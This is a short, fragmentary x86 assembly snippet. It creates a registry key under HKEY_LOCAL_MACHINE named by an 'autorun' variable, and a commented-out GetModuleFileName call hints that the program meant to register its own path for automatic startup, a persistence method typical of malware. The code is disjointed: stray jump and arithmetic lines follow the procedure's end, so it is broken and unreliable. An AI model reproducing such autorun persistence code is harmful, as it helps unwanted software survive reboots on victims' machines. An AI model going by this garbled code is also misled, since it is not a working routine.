        local   @hKey

local   @szFileName[MAX\_PATH]:byte

invoke  RegCreateKey,HKEY\_LOCAL\_MACHINE,addr szKeyAutoRun ,addr @hKey

;invoke GetModuleFileName,NULL,addr @szFileName,260

ret

func endp

  jmp pushaddr

        add eax,100Bh
